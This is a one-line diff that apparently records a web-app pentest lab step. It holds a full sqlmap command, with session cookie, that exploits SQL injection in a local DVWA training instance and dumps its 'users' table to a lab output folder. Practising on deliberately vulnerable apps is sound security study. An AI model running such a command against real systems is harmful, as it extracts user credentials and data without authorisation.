@@ -1,0 +1,1 @@
+http://192.168.56.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit (GET)  # /usr/bin/sqlmap -u http://192.168.56.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit "--cookie=PHPSESSID=643afcebff899fe1f2cb80c960433d1a; security=low" -D dvwa -T users --dump --batch --output-dir=/home/kali/web-app-pentest-lab/scans/sqlmap-output
